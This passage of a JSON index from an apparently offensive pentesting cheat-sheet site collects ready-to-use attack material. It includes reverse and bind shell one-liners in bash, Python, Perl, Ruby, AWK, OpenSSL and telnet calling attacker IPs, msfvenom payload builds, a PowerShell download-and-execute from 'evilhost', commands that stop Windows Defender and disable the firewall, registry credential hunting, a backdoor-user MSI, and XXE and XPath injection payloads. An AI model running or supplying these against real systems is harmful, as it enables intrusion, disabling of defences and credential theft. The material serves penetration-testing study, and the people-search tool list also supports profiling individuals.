\u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39; # Using msfvenom msfvenom -p php/shell/reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php #You can also use the php reverse shell with a complete handler by pentest-monkey, available in Kali by default \nWindows msfvenom -p windows/shell_reverse_tcp -b “\\x00\\x0a\\x0d” LHOST=IP LPORT=443 -f asp \u0026gt; acknak_TCP_RS.asp msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/shikata_ga_nai -o shell.aspx \nLinux bash -i \u0026gt;\u0026amp; /dev/tcp/ATTACKING-IP/443 0\u0026gt;\u0026amp;1 bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.10/443 0\u0026gt;\u0026amp;1 \nAWK awk \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/10.10.14.10/80\u0026#34;; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s; s |\u0026amp; getline c;\\ if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s; close(c); } } while(c != \u0026#34;exit\u0026#34;) close(s); }}\u0026#39; /dev/null OR #!/usr/bin/awk -f BEGIN { s = \u0026#34;/inet/tcp/0/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt;\u0026#34; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s s |\u0026amp; getline c if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s close(c) } } while(c != \u0026#34;exit\u0026#34;) close(s) } } OR #!/usr/bin/gawk -f  BEGIN { Port = 443 Prompt = \u0026#34;pwn\u0026gt; \u0026#34; Service = \u0026#34;/inet/tcp/\u0026#34; Port \u0026#34;/0/0\u0026#34; while (1) { do { printf Prompt |\u0026amp; Service Service |\u0026amp; getline cmd if (cmd) { while ((cmd |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; Service close(cmd) } } while (cmd != \u0026#34;exit\u0026#34;) close(Service) } } \nPython #!/usr/bin/env python import socket,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.11.0.179\u0026#34;,443)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.system(\u0026#34;/bin/sh -i\u0026#34;) OR python -c “import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;IP\u0026#39;,443));\\ os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\u0026#39;/bin/sh -i\u0026#39;)” # UDP python -c \u0026#39;import socket,pty,os;lhost = \u0026#34;IP\u0026#34;; lport = 100;\\ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport));\\ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\\ os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#34;/dev/null\u0026#34;); pty.spawn(\u0026#34;/bin/bash\u0026#34;); s.close();\u0026#39; \nWindows - WAR Reverse Shell # Build the payload msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war # File Structure reverse_shell.war | |__reverse_shell.jsp | |_____META-INF/ | |_____WEB-INF/ | |____web.xml # Explanations web.xml is asking for a reference to /cmd.jsp, when you upload the .war you can then access to /cmd/ directory, just ask cmd.jsp and that\\\u0026#39;s it # Then access \u0026lt;IP\u0026gt;/reverse_shell/reverse_shell.jsp # And.. nc -nvlp 443 \nThrough OpenSSL # Generate certificate: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port \u0026lt;PORT\u0026gt; # Reverse Shell: mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect \u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt; \u0026gt; /tmp/s;\\ rm /tmp/s mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect \u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt; \u0026gt; /tmp/s;\\ rm /tmp/s \nTelnet telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443 OR rm f;mkfifo f;cat f|/bin/sh -i 2\u0026gt;\u0026amp;1|telnet \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; f rm -f x; mknod x p \u0026amp;\u0026amp; telnet \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;x | /bin/bash 1\u0026gt;x (Listen on the port 443 machine) \nUsing LUA In MSF =\u0026gt; payload/cmd/unix/reverse_lua OR this tool: https://github.com/cuhsat/palantir \nRuby # Linux ruby -rsocket -e \u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; ruby -rsocket -e \u0026#39;f=TCPSocket.open(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; # Windows ruby -rsocket -e \u0026#34;c=TCPSocket.new(\u0026#39;\u0026lt;IP\u0026gt;\u0026#39;,\u0026lt;PORT\u0026gt;);while(cmd=c.gets);IO.popen(cmd,\u0026#39;r\u0026#39;){|io|c.print io.read}end\u0026#34; \nPerl # Windows perl -MIO -e \u0026#39;$c=new IO::Socket::INET(PeerAddr,\u0026#34;ATTACKING-IP:80\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; # Linux perl -e \u0026#39;use Socket;$i=\u0026#34;ATTACKING-IP\u0026#34;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;))\\ if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);\\ open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39;"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/searchingsomeone/",
	"title": "Searching Someone",
	"tags": [],
	"description": "",
	"content": " Searching People https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit...)"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/",
	"title": "Spiderfoot",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/smicallef/spiderfoot https://www.spiderfoot.net/documentation/ # Query over 100 OSINT sources (IP, domain names, email, names and more) # Select the target, pick modules and spiderfoot will collect and build links # You can identify data leaks, vulnerabilities or sensitive information # Windows and Linux # Needed API Keys : Honeypot Checker, Shodan, VirusTotal, IBM X-Force Exchange # MalwarePatrol, BotScout, Cymon.io, Censys.io, Hunter.io, AlienVault OTX, ClearBit # BuiltWith, FraudGuard, IPinfo.io, CIRCL.LU, SecurityTrails, FullContact.com, RiskIQ # Citadel.pw  \nStarting # Start a server on localhost:5001 python ./sf.py # CLI possible python ./sfcli.py --help # You can also use it remotely python ./sf.py \u0026lt;externalIP\u0026gt; python ./sf.py 0.0.0.0:5001 python ./sfcli.py -u http://\u0026lt;remote ip\u0026gt;:5001 \nUsing Spiderfoot # You can initiate new scans → Need name and target (domain, ip, subdomain, subnet) → By Use Case → By Required Data → By Module (more advanced) # No dependency checking with module scanning, if one module need others module result, you won\u0026#39;t get any data. # Scan result → Bar chart (clickable) # Browsing results → Searchable results → Data type → Checkbox : set/unset as false positive (orange button) → Black icon to change display # Searching results → You can search at the entire scan level or by data type ⇒ Exact Value ⇒ Pattern Matching → Simple pattern (*:22) ⇒ Regex search → Classic string regex ( ‘/\\d+.\\d+.\\d+.\\d+/’) # Modules → When a module gets a data, this one is transmitted to other potentially interested modules → They will process it and generate new events, maybe find others data.. And so on → All modules works with data types ⇒ entities → Like IP, hostnames etc ⇒ subentities → Like port numbers, URLs etc ⇒ descriptors → Description of these entities ⇒ data → Mostly unstructured data (web page content...)"
},
{
	"uri": "/windows-systems/privilege-escalation/tricks/",
	"title": "Tricks",
	"tags": [],
	"description": "",
	"content": " Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(\u0026#34;start cmd.exe /k $cmd\u0026#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\\system32\\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://evilhost/Malicious.ps1\u0026#39;)\u0026#34; \nUnquoted Paths # Some paths are vulnerable # It occurs because Windows will try for every whitespace, to find the binary in every intermediate folder C:\\Program Files\\something\\winamp.exe # You could place your payload in C:\\Program.exe C:\\Program Files.exe # The following command will display affected services wmic service get name,displayname,pathname,startmode |findstr /i \u0026#34;Auto\u0026#34; |findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; |findstr /i /v \u0026#34;\u0026#34;\u0026#34; \nClear text passwords # You can find passwords in arbitrary files findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini # Find all passwords in all files findstr /spin \u0026#34;password\u0026#34; *.* # Some common files to find them in dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini # Stuff in the registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; reg query \u0026#34;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026#34; reg query \u0026#34;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026#34; reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password # Search for passwords in the registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s \nRun As # If application is running as admin and credentials saved in there you can abuse it by modifying its properties that way: C:\\WINDOWS\\system32\\runas.exe /user:administrator /savecreds \u0026#34;C:\\Documents and Settings\\username\\Desktop\\nc.exe -nc 10.11.0.179 41337 -e C:\\Windows\\System32\\cmd.exe\u0026#34; # If you want to run a simple runas.exe: C:\\WINDOWS\\system32\\runas.exe /user:administrator /password:pass \u0026#34;C:\\Documents and Settings\\username\\Desktop\\nc.exe -nc 10.11.0.179 41337 -e C:\\Windows\\System32\\cmd.exe\u0026#34; \nKerberoast powershell.exe -ExecutionPolicy Bypass -NoLogo \u0026#34;setspn -T medin -Q */*\u0026#34; powershell.exe -ExecutionPolicy Bypass -NoLogo \u0026#34;Add-Type -AssemblyName System.IdentityModel\u0026#34; powershell.exe -ExecutionPolicy Bypass -NoLogo \u0026#39;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;HTTP/web01.medin.local\u0026#34;\u0026#39; klist \nAlwaysInstallElevated # It\u0026#39;s a setting allowing unprivileged users to run Windows Installer Packages Files (MSI) with elevated permissions (SYSTEM) # Check the value of this registry reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # If set to 1, you can create your own MSI msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi # You can then use msiexec to execute the payload msiexec /quiet /qn /i C:\\evil.msi"
},
{
	"uri": "/recon-enumeration/application-scans/web_application_firewall/",
	"title": "Web Application Firewall (WAF)",
	"tags": [],
	"description": "",
	"content": " General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks ./wafw00l -l ./wafw00t https://target.com \nManuel check # Through telnet, you can identify if there is a WAF telnet \u0026lt;site/ip\u0026gt; \u0026lt;80/443\u0026gt; GET / HTTP/1.1 \nCloudFlair # CloudFlair is a tool to find origin servers of websites protected by CloudFlare who are publicly exposed # and don\u0026#39;t restrict network access to the CloudFlare IP ranges as they should. # The tool uses Internet-wide scan data from Censys to find exposed IPv4 hosts # presenting an SSL certificate associated with the target\u0026#39;s domain name # Docker image is available (https://github.com/christophetd/CloudFlair) # Create env variable for the Censys API key $ export CENSYS_API_ID=... $ export CENSYS_API_SECRET=... # Then python cloudflair.py myvulnerable.site # Docker docker run --rm -e CENSYS_API_ID=your-id -e CENSYS_API_SECRET=your-secret christophetd/cloudflair myvulnerable.site # You can also create env file cat censys.env CENSYS_API_ID=your-id CENSYS_API_SECRET=your-secret docker run --rm --env-file=censys.env christophetd/cloudflair myvulnerable.site \nCloudFail # CloudFail is a tactical reconnaissance tool which aims to gather enough information about a target # protected by Cloudflare in the hopes of discovering the location of the server. # Using Tor to mask all requests, the tool as of right now has 3 different attack phases. # 1. Misconfigured DNS scan using DNSDumpster.com. # 2. Scan the Crimeflare.com database. # 3. Bruteforce scan over 2500 subdomains. # Classic scan python3 cloudfail.py --target sodifrance.fr # TOR scan service tor start python3 cloudfail.py --target sodifrance.fr --tor"
},
{
	"uri": "/windows-systems/privilege-escalation/windows_defender/",
	"title": "Windows Defender",
	"tags": [],
	"description": "",
	"content": "# Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command \u0026#34;\u0026amp; { . C:\\Users\\Username\\AppData\\Local\\Temp\\sudo_PS1-0.ps1; }\u0026#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable"
},
{
	"uri": "/web-attacks/files-inclusions-and-injections/xxe/",
	"title": "XML External Entity (XXE) and XSLT",
	"tags": [],
	"description": "",
	"content": " Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf \nBasic XXE \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=path/index.php\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt;# XXE via Word: \u0026lt;!-- word/document.xml --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY % pe SYSTEM \u0026#34;nc -nlvp 31337\u0026#34;\u0026gt; %pe; ]\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;external;\u0026lt;/foo\u0026gt; \u0026lt;!-- word/document.xml --\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ELEMENT r ANY \u0026gt; \u0026lt;!ENTITY sp SYSTEM \u0026#34;nc -nlvp 31337\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;r\u0026gt;\u0026amp;sp;\u0026lt;/r\u0026gt; \nXSLT Injection # You can execute commands through an external XML file \u0026lt;br /\u0026gt;Version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor URL: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor-url\u0026#39;)\u0026#34; /\u0026gt; # Example \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;html xsl:version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;php:function(\u0026#39;readfile\u0026#39;,\u0026#39;index.php\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; # Look for resource \u0026lt;xsl:variable name=\u0026#34;scana\u0026#34;\u0026gt; implode(\u0026#39;\u0026lt;br/\u0026gt;\u0026#39;,scandir(\u0026#39;.\u0026#39;)) \u0026lt;/xsl:variable\u0026gt; \u0026lt;br /\u0026gt;Scan dir 1: \u0026lt;xsl:value-of select=\u0026#34;php:function(\u0026#39;preg_replace\u0026#39;, \u0026#39;/.*/e\u0026#39;, $scana, \u0026#39;\u0026#39;)\u0026#34; /\u0026gt;"
},
{
	"uri": "/web-attacks/server-side-injections/xpath/",
	"title": "XPath Injections",
	"tags": [],
	"description": "",
	"content": " Basic authentication bypass # XPath login/password often works as follow # $xpath = \u0026quot;//user[user='\u0026quot; . $_GET['user'] . \u0026quot;' and pass='\u0026quot; . $_GET['pass'] . \u0026quot;']\u0026quot;; # You can make the 2 conds TRUE and log with the first user user=' or '1'='1\u0026amp;pass=' or '1'='1 # Log using a specific user //user[username='' or '1'='1' and password='truc'] ⇒ John' or '1'='1 # Bypass the password (because of the ‘=’) ' or username='John' or ''='  \nString XPath Injection # You can use following: to display all the following attributes after the node a')]/following::*[('1'='1 # You can inject in the contains() # Just bypass the first condition to get out of //user/username and then display the whole user content search=')] | //user/*[contains(*,' # You can just escape username to request password field search=Har')%20and%20contains(../password,'c search=Har') and starts-with(../password,'c  \nBlind XPath Injection # Identify columns \u0026amp;userid=2 and password # The first thing is to retrieve the password length, through boolean expression # First is wrong OR user1 displayed if password is 10 long OR user2 displayed userid=22222 ] | //user[1][userid=1 and string-length(//user[2]/password)=10] | //user[userid=2 # Then you can start to bruteforce char userid=1 and substring(//user[1]/password,1,1)='p' # If quotes are filtered, you can use others XML objects to compare (limited dictionnary) # First is wrong OR user1 displayed if the user2's password first char = user1's username first char OR user2 displayed userid=\u0026quot;22222 ] | //user[1][userid=1 and substring(//user[2]/password,1,1)=substring(//user[1]/username,1,1) ] | //user[userid=2  "
},
{
	"uri": "/recon-enumeration/services-enumeration/80_443_https/",
	"title": "80/443 - HTTP/HTTPS",
	"tags": [],
	"description": "",
	"content": " Identification and Checks # IIS nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-iis-webdav-vuln \u0026lt;IP\u0026gt; # JBOSS (CVE-2010-0738) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2010-0738 \u0026lt;IP\u0026gt; # PHP-CGI (CVE-2012-1823) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2012-1823 \u0026lt;IP\u0026gt; # RCE Ruby on Rails (CVE-2013-0156) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2013-0156 \u0026lt;IP\u0026gt; # WAF Detection nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-waf-detect,http-waf-fingerprint \u0026lt;IP\u0026gt; # Check Heartbleed CVE-2014-0160 nmap -Pn -n -p 443 -v -T3 --script=ssl-heartbleed,ssl-enum-ciphers,ssl-known-key --script-args vulns.showall -sV --version-intensity=5 \u0026lt;IP\u0026gt; \nHeartbleed Exploitation (CVE-2014-0160) # Using metasploit use auxiliary/scanner/ssl/openssl_heartbleed set action SCAN ... run set action KEYS run"
},
{
	"uri": "/shells-methods/bind/",
	"title": "Bind Shell",
	"tags": [],
	"description": "",
	"content": " Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc -lvp 51337 \u0026gt;/tmp/f \nWindows msfvenom -p windows/shell_bind_tcp -b “\\x00\\x0a\\x0d” LHOST=IP LPORT=1337 -f asp \u0026gt; acknak_TCP_RS.asp \nPerl perl -e \u0026#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);exec(\u0026#34;/bin/bash -i\u0026#34;);};\u0026#39; \nPHP php -r \u0026#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\u0026#34;0.0.0.0\u0026#34;,51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\u0026#34;$ \u0026#34;,2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\u0026#34;$in\u0026#34;,\u0026#34;r\u0026#34;);while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}\u0026#39; \nRuby ruby -rsocket -e \u0026#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,s,s,s)\u0026#39;"
},
{
	"uri": "/open-source-intelligence-osint/buscador/",
	"title": "Buscador",
	"tags": [],
	"description": "",
	"content": " Tools Custom Firefox Browser \u0026amp; Add-Ons Custom Chrome Browser \u0026amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego\tMetagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities \nTools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application. # GIMP → Image manipulation tool # Google Earth Pro → Advanced Google Earth → Browse and create maps # HTTrack Cloner → Copy website locally → It downloads website content and rebuild the file structure # InstaLooter → API-less Instagram pictures and videos downloader # KeePassXC → Keepass Cross Platform Community Edition # Kleopatra → Kleopatra is a certificate manager and GUI for GnuPG # Knock Pages → Subdomain bruteforce → Virustotal, wildcard, zone transfer → Using a wordlist # LibreOffice → Known one # LinkedInt → LinkedIn Intelligence → Find emails, companies etc # Maltego → # Metagoofil → Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # MediaInfo → Complete tool used to get information about local files → Metada etc # Metadata anonymisation Toolkit → Small tool used to anonymise file\\\u0026#39;s metadata # PhoneInfoga → Information gathering \u0026amp; OSINT reconnaissance tool for phone numbers → Scan phone numbers using only free resources → The goal is to first gather standard information such as country, area, carrier and line type on any international phone numbers → Then search for footprints on search engines to try to find the VoIP provider or identify the owner → Features ⇒ Check if phone number exists and is possible ⇒ Gather standard informations such as country, line type and carrier ⇒ OSINT footprinting using external APIs, Google Hacking, phone books \u0026amp; search engines ⇒ Check for reputation reports, social media, disposable numbers and more ⇒ Scan several numbers at once ⇒ Use custom formatting for more effective OSINT reconnaissance ⇒ Automatic footprinting on several custom formats # Photon → Photon is a fast OSINT web crawler which can retrieve the following data for a target : → URLs (in-scope \u0026amp; out-of-scope) → URLs with parameters (example.com/gallery.php?id=2) → Intel (emails, social media accounts, amazon buckets etc.) → Files (pdf, png, xml etc.) → Secret keys (auth/API keys \u0026amp; hashes) → JavaScript files \u0026amp; Endpoints present in them → Strings matching custom regex pattern → Subdomains \u0026amp; DNS related data # ReconDog → Recon Dog is an all in one tool for all your basic information gathering needs. → It uses APIs to gather all the information so your identity is not exposed. → Simple and basic standalone python script → All informations seems to be extracted from API\\\u0026#39;s services, so it fully passive # Recon-NG → Complete Framework → Reconnaissance → Usage of open sources (passive) → Discovery → More active, packets sent to target # SkipTracer → It uses some basic python webscraping to compile passive information on a target → Included modules will allow queries for the following : ⇒ Phone ⇒ Email ⇒ Screen names ⇒ Real names ⇒ Addresses ⇒ IP ⇒ Hostname ⇒ Breach Credentials # SocialMapper # Spiderfoot → Query over 100 OSINT sources (IP, domain names, email, names and more) → Select the target, pick modules and spiderfoot will collect and build links → You can identify data leaks, vulnerabilities or sensitive information → Windows and Linux # StegoSuite → Free and open source steganography tool written in Java. → With Stegosuite you can easily hide information in image files. # SubBrute → A DNS meta-query spider that enumerates DNS records, and subdomains. → Subdomain bruteforce # Sublist3r → Subdomain enumeration and BF → Great tool # theHarvester → theHarvester is a famous OSINT and scrapping tool for passiv recon on targets → Using API keys will highly increase results # Tinfoleak → The most complete open-source tool for Twitter intelligence analysis → UI tool # Twint → An advanced Twitter scraping \u0026amp; OSINT tool written in Python that doesn\\\u0026#39;t use Twitter\\\u0026#39;s API → Allowing you to scrape a user\\\u0026#39;s followers, following, Tweets and more while evading most API limitations. → Not rate limitations → Creates dashboard Twitter Exporter → ??? VeraCrypt → Known one, encryption VLC → Known one, video Yubico Utilities → tools for using yubikeys"
},
{
	"uri": "/web-attacks/content-management-system-cms/cmsmap/",
	"title": "CMSMap",
	"tags": [],
	"description": "",
	"content": " Intro # CMSmap is a python open source CMS scanner that automates the process # of detecting security flaws of the most popular CMSs. # The main purpose of CMSmap is to integrate common vulnerabilities for # different types of CMSs in a single tool. # At the moment, CMSs supported by CMSmap are WordPress, Joomla, Drupal and Moodle. \nUsage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p] [-x] [-k] [-w] [-v] [-h] [-D] [-U W/J/D] [target] CMSmap tool v1.0 - Simple CMS Scanner Author: Mike Manzotti Scan: target target URL (e.g. \u0026#39;https://example.com:8080/\u0026#39;) -f W/J/D, --force W/J/D force scan (W)ordpress, (J)oomla or (D)rupal -F, --fullscan full scan using large plugin lists. False positives and slow! -t , --threads number of threads (Default 5) -a , --agent set custom user-agent -H , --header add custom header (e.g. \u0026#39;Authorization: Basic ABCD...\u0026#39;) -i , --input scan multiple targets listed in a given file -o , --output save output in a file -E, --noedb enumerate plugins without searching exploits -c, --nocleanurls disable clean urls for Drupal only -s, --nosslcheck don\u0026#39;t validate the server\u0026#39;s certificate -d, --dictattack run low intense dictionary attack during scanning (5 attempts per user) Brute-Force: -u , --usr username or username file -p , --psw password or password file -x, --noxmlrpc brute forcing WordPress without XML-RPC Post Exploitation: -k , --crack password hashes file (Require hashcat installed. For WordPress and Joomla only) -w , --wordlist wordlist file Others: -v, --verbose verbose mode (Default false) -h, --help show this help message and exit -D, --default rum CMSmap with default options -U, --update use (C)MSmap, (P)lugins or (PC) for both Examples: cmsmap.py https://example.com cmsmap.py https://example.com -f W -F --noedb -d cmsmap.py https://example.com -i targets.txt -o output.txt cmsmap.py https://example.com -u admin -p passwords.txt cmsmap.py -k hashes.txt -w passwords.txt"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/company_meta/",
	"title": "Company General Informations",
	"tags": [],
	"description": "",
